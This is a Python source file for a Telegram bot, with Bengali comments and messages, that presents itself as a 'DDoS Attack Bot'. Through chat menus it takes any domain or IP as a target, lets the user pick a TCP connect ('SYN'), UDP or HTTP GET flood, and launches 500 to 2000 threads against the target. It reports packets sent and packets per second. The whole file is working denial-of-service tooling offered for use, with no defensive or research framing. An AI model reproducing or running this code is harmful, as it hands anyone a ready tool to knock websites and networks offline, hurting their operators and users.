import logging
import os
import json
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)
import requests
import io
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time
import socket

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# এনভায়রনমেন্ট ভ্যারিয়েবল
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
PORT = int(os.getenv("PORT", 8000))
HEALTH_CHECK_PORT = PORT

if not TELEGRAM_BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_BOT_TOKEN সেট করো")

# মেমরি ফাইল
MEMORY_FILE = "bot_memory.json"
ATTACKS_FILE = "active_attacks.json"

class BotMemory:
    """ইউজার মেমরি ম্যানেজার"""
    
    @staticmethod
    def load():
        """মেমরি লোড করো"""
        if Path(MEMORY_FILE).exists():
            try:
                with open(MEMORY_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save(data):
        """মেমরি সেভ করো"""
        with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    
    @staticmethod
    def get_user(user_id):
        """ইউজার মেমরি পাও"""
        memory = BotMemory.load()
        return memory.get(str(user_id), {
            "generations": 0,
            "last_prompt": None,
            "memory_enabled": True,
            "attack_active": False,
            "attack_target": None
        })
    
    @staticmethod
    def update_user(user_id, data):
        """ইউজার মেমরি আপডেট করো"""
        memory = BotMemory.load()
        memory[str(user_id)] = data
        BotMemory.save(memory)

class AttackManager:
    """DDoS অ্যাটাক ম্যানেজমেন্ট"""
    
    def __init__(self):
        self.active_attacks = {}
        self.lock = threading.Lock()
    
    @staticmethod
    def load_attacks():
        """সেভড অ্যাটাক লোড করো"""
        if Path(ATTACKS_FILE).exists():
            try:
                with open(ATTACKS_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save_attacks(data):
        """অ্যাটাক সেভ করো"""
        with open(ATTACKS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
    
    def syn_flood_worker(self, target_ip, target_port, user_id):
        """TCP SYN ফ্লুড ওয়ার্কার"""
        attack_data = self.active_attacks.get(user_id, {})
        packet_count = 0
        
        while attack_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((target_ip, target_port))
                sock.close()
                packet_count += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packet_count
                
            except:
                pass
            
            time.sleep(0.001)
    
    def udp_flood_worker(self, target_ip, target_port, user_id):
        """UDP ফ্লুড ওয়ার্কার"""
        attack_data = self.active_attacks.get(user_id, {})
        payload = b"X" * 512
        packet_count = 0
        
        while attack_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
                packet_count += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packet_count
                
            except:
                pass
    
    def http_flood_worker(self, target_host, target_port, user_id):
        """HTTP ফ্লুড ওয়ার্কার"""
        try:
            target_ip = socket.gethostbyname(target_host)
        except:
            return
        
        attack_data = self.active_attacks.get(user_id, {})
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        packet_count = 0
        
        while attack_data.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.sendall(request)
                sock.close()
                packet_count += 1
                
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packet_count
                
            except:
                pass
    
    def start_attack(self, user_id, target, attack_type, threads=500):
        """অ্যাটাক স্টার্ট করো"""
        try:
            if ':' in target:
                target_host, port_str = target.rsplit(':', 1)
                target_port = int(port_str)
            else:
                target_host = target
                target_port = 80
            
            # IP রেজোলভ করো
            try:
                target_ip = socket.gethostbyname(target_host)
            except:
                return False, "Domain resolution failed"
            
            with self.lock:
                self.active_attacks[user_id] = {
                    'target': target_host,
                    'port': target_port,
                    'type': attack_type,
                    'active': True,
                    'packets': 0,
                    'start_time': time.time(),
                    'threads': threads
                }
            
            # ওয়ার্কার থ্রেড স্টার্ট করো
            worker_map = {
                'syn': self.syn_flood_worker,
                'udp': self.udp_flood_worker,
                'http': self.http_flood_worker
            }
            
            worker = worker_map.get(attack_type, self.http_flood_worker)
            
            for i in range(threads):
                if attack_type == 'http':
                    t = threading.Thread(
                        target=worker,
                        args=(target_host, target_port, user_id),
                        daemon=True
                    )
                else:
                    t = threading.Thread(
                        target=worker,
                        args=(target_ip, target_port, user_id),
                        daemon=True
                    )
                t.start()
            
            return True, f"🚀 অ্যাটাক স্টার্ট: {target_host}:{target_port} ({attack_type}) - {threads} threads"
        
        except Exception as e:
            return False, f"❌ এরর: {str(e)}"
    
    def stop_attack(self, user_id):
        """অ্যাটাক স্টপ করো"""
        with self.lock:
            if user_id in self.active_attacks:
                self.active_attacks[user_id]['active'] = False
                packets = self.active_attacks[user_id].get('packets', 0)
                del self.active_attacks[user_id]
                return True, packets
        
        return False, 0
    
    def get_attack_status(self, user_id):
        """অ্যাটাক স্ট্যাটাস পাও"""
        if user_id in self.active_attacks:
            attack = self.active_attacks[user_id]
            duration = time.time() - attack['start_time']
            pps = attack['packets'] / max(duration, 1)
            
            return {
                'active': True,
                'target': attack['target'],
                'port': attack['port'],
                'type': attack['type'],
                'packets': attack['packets'],
                'duration': int(duration),
                'pps': int(pps),
                'threads': attack['threads']
            }
        
        return {'active': False}

# গ্লোবাল অ্যাটাক ম্যানেজার
attack_mgr = AttackManager()

class HealthCheckHandler(BaseHTTPRequestHandler):
    """HTTP Health Check হ্যান্ডলার"""
    
    def do_GET(self):
        """GET / এ সাড়া দাও"""
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is running now.... ")
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """লগ সাইলেন্ট করো"""
        pass

def start_health_check():
    """Health Check সার্ভার শুরু করো"""
    try:
        server = HTTPServer(("0.0.0.0", HEALTH_CHECK_PORT), HealthCheckHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        logger.info(f"🏥 health check on 0.0.0.0:{HEALTH_CHECK_PORT}")
    except Exception as e:
        logger.warning(f"Health check error: {e}")

# টেলিগ্রাম হ্যান্ডলার

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """স্টার্ট কমান্ড — মেইন মেনু"""
    keyboard = [
        [
            InlineKeyboardButton("🎯 DDoS Attack", callback_data="ddos_mode"),
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
        ],
        [
            InlineKeyboardButton("🛑 Stop", callback_data="stop_attack"),
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚡ **DDoS Attack Bot**\n\n"
        "কিভাবে ব্যবহার করবে:\n"
        "• 'DDoS Attack' ক্লিক করো\n"
        "• টার্গেট ডোমেইন/IP দাও\n"
        "• অ্যাটাক টাইপ বেছে নাও\n"
        "• থ্রেড সংখ্যা দাও\n"
        "• অ্যাটাক স্টার্ট হয়ে যাবে\n\n"
        "🛑 '/stop' দিয়ে থামাও",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """সাহায্য কমান্ড"""
    await update.message.reply_text(
        "**অ্যাটাক টাইপ:**\n"
        "• `syn` - TCP SYN Flood\n"
        "• `udp` - UDP Flood\n"
        "• `http` - HTTP GET Flood\n\n"
        "**কমান্ড:**\n"
        "/start - মেইন মেনু\n"
        "/stop - অ্যাটাক থামাও\n"
        "/status - স্ট্যাটাস দেখো\n\n"
        "**উদাহরণ টার্গেট:**\n"
        "`example.com`\n"
        "`192.168.1.1`\n"
        "`example.com:8080`",
        parse_mode="Markdown"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """অ্যাটাক স্টপ করো"""
    user_id = update.message.from_user.id
    success, packets = attack_mgr.stop_attack(user_id)
    
    if success:
        await update.message.reply_text(
            f"🛑 **অ্যাটাক থামানো হয়েছে**\n\n"
            f"📊 পাঠানো প্যাকেট: {packets}"
        )
    else:
        await update.message.reply_text("❌ কোনো অ্যাটাক চলছে না")

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """মেমরি ক্লিয়ার"""
    user_id = update.message.from_user.id
    attack_mgr.stop_attack(user_id)
    user_data = BotMemory.get_user(user_id)
    user_data["attack_active"] = False
    user_data["attack_target"] = None
    BotMemory.update_user(user_id, user_data)
    
    await update.message.reply_text("🗑️ মেমরি ক্লিয়ার করা হয়েছে")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """ইনলাইন বাটন ক্যালব্যাক"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "ddos_mode":
        await query.edit_message_text("🎯 টার্গেট ডোমেইন বা IP দাও:\n\nউদাহরণ: `example.com` অথবা `192.168.1.1:8080`")
        context.user_data['waiting_for_target'] = True
    
    elif query.data == "stats":
        status = attack_mgr.get_attack_status(user_id)
        if status['active']:
            msg = (
                f"📊 **লাইভ অ্যাটাক স্ট্যাটাস**\n\n"
                f"🎯 টার্গেট: {status['target']}:{status['port']}\n"
                f"⚔️ টাইপ: {status['type']}\n"
                f"📤 প্যাকেট: {status['packets']}\n"
                f"⏱️ সময়: {status['duration']}s\n"
                f"💨 PPS: {status['pps']}\n"
                f"🧵 থ্রেড: {status['threads']}"
            )
        else:
            user_data = BotMemory.get_user(user_id)
            msg = (
                f"📊 **সামগ্রিক স্ট্যাটাস**\n\n"
                f"🎨 তৈরি: {user_data.get('generations', 0)}\n"
                f"⚡ অ্যাটাক: {'চলছে না'}"
            )
        await query.edit_message_text(msg, parse_mode="Markdown")
    
    elif query.data == "stop_attack":
        success, packets = attack_mgr.stop_attack(user_id)
        if success:
            await query.edit_message_text(
                f"🛑 **অ্যাটাক থামানো হয়েছে**\n\n"
                f"📊 পাঠানো প্যাকেট: {packets}"
            )
        else:
            await query.edit_message_text("❌ কোনো অ্যাটাক চলছে না")
    
    elif query.data == "help":
        await query.edit_message_text(
            "**অ্যাটাক টাইপ:**\n"
            "`syn` - TCP SYN Flood (দ্রুততম)\n"
            "`udp` - UDP Flood (লাইটওয়েট)\n"
            "`http` - HTTP GET (অ্যাপ্লিকেশন লেয়ার)\n\n"
            "**থ্রেড রেঞ্জ:** 500-2000 (ডিফল্ট: 500)\n"
            "বেশি = বেশি লোড",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """টেক্সট মেসেজ হ্যান্ডল"""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    
    if context.user_data.get('waiting_for_target'):
        context.user_data['target'] = text
        context.user_data['waiting_for_target'] = False
        context.user_data['waiting_for_type'] = True
        
        await update.message.reply_text(
            f"✅ টার্গেট: `{text}`\n\n"
            "অ্যাটাক টাইপ বেছে নাও:\n"
            "`syn` - TCP SYN\n"
            "`udp` - UDP\n"
            "`http` - HTTP",
            parse_mode="Markdown"
        )
    
    elif context.user_data.get('waiting_for_type'):
        attack_type = text.lower()
        if attack_type not in ['syn', 'udp', 'http']:
            await update.message.reply_text("❌ ভালো না। ব্যবহার করো: syn | udp | http")
            return
        
        context.user_data['type'] = attack_type
        context.user_data['waiting_for_type'] = False
        context.user_data['waiting_for_threads'] = True
        
        await update.message.reply_text(
            f"✅ টাইপ: `{attack_type}`\n\n"
            "থ্রেড সংখ্যা? (৫০০-২০০০, ডিফল্ট: ৫০০)\n"
            "সংখ্যা দাও অথবা শুধু 'go' দিয়ে ডিফল্ট ব্যবহার করো",
            parse_mode="Markdown"
        )
    
    elif context.user_data.get('waiting_for_threads'):
        threads = 500
        if text.lower() != 'go':
            try:
                threads = int(text)
                if threads <500 or threads > 2000:
                    await update.message.reply_text("❌ ৫০০-২০০০ এর মধ্যে দাও")
                    return
            except ValueError:
                await update.message.reply_text("❌ সংখ্যা দাও")
                return
        
        context.user_data['waiting_for_threads'] = False
        
        target = context.user_data['target']
        attack_type = context.user_data['type']
        
        success, msg = attack_mgr.start_attack(user_id, target, attack_type, threads)
        
        if success:
            user_data = BotMemory.get_user(user_id)
            user_data['attack_active'] = True
            user_data['attack_target'] = target
            BotMemory.update_user(user_id, user_data)
            await update.message.reply_text(msg)
        else:
            await update.message.reply_text(f"❌ {msg}")

def main():
    """মেইন ফাংশন"""
    start_health_check()
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info("🚀 Bot started (Telegram polling…)")
    
    app.run_polling(
        poll_interval=3.0,
        timeout=60,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("বট বন্ধ হয়েছে")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        raise
